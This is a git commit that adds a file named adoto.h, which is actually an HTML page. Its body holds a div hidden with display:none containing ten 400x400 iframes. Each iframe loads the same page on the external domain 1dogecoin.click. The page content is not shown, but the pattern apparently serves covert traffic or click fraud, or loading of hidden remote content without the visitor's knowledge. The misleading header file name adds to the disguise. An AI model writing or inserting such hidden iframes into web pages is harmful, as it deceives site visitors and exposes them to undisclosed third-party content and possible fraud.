966ed05f9066baa2f0b52669001c07f01ae24c13
dogecoinclick <147787609+dogecoinclick@users.noreply.github.com>
2024-01-06 07:55:06 +0700

    Create adoto.h

---
+++ adoto.h
@@ -0,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="style.css">
+	  <script>
+   </script>
+
+</head>
+<body>
+		 
+		<div style="display:none">
+
+
+
+			<iframe width="400" height="400" src="https://1dogecoin.click/adoto1"></iframe>
+			<iframe width="400" height="400" src="https://1dogecoin.click/adoto1"></iframe>
+  <iframe width="400" height="400" src="https://1dogecoin.click/adoto1"></iframe>
+			<iframe width="400" height="400" src="https://1dogecoin.click/adoto1"></iframe>
+  <iframe width="400" height="400" src="https://1dogecoin.click/adoto1"></iframe>
+			<iframe width="400" height="400" src="https://1dogecoin.click/adoto1"></iframe>
+  <iframe width="400" height="400" src="https://1dogecoin.click/adoto1"></iframe>
+			<iframe width="400" height="400" src="https://1dogecoin.click/adoto1"></iframe>
+  <iframe width="400" height="400" src="https://1dogecoin.click/adoto1"></iframe>
+			<iframe width="400" height="400" src="https://1dogecoin.click/adoto1"></iframe>
+
+</div>
+
+</body>
+</html>
